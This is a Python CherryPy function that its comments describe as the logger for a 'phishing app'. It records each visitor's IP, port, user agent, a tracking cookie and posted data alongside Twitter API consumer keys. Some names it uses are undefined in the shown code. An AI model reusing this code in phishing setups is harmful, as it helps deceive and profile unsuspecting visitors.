
import requests
from TwitterAPI import TwitterAPI
from phpserialize import serialize
import callback.GlobalFunctions;
import socket
import cherrypy
from callback.CallbackEnum import *;
from datetime import datetime;

def Logger():

    #Get local datetime ..
    now = datetime.now();
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S");

    #Get current phishing app ..
    appEnumString = cherrypy.session['selectedEnum'];
    appEnum = getEnumFromAppName(appEnumString);

    logger_token = {}
    # Logger data ...
    logger_token['ip'] = cherrypy.request.headers['Remote-Addr'];
    logger_token['ip2'] = ""; #requests.getlist("X-Forwarded-For")
    logger_token['ip3'] = ""; #requests.headers.getlist("X-Forwarded-For").split(",")[0]
    logger_token['port'] = cherrypy.request.remote.port;
    logger_token['useragent'] = cherrypy.request.headers['User-Agent'];
    logger_token['cookie'] = cherrypy.response.cookie['KuwaitCyberCrimeCookie'];
    logger_token['referer'] = "";
    logger_token['query'] = "";
    logger_token['postdata']= cherrypy.request.params['appEnumString'];
    logger_token['time']= dt_string;
    logger_token['consumer_key']=ConsumerKeyString[appEnum];
    logger_token['consumer_secret']= ConsumerSecretString[appEnum];

    print("Logger results:")
    #Save the logger token in the cherrypy session
    cherrypy.session['logger_token']=logger_token;
    print(logger_token)
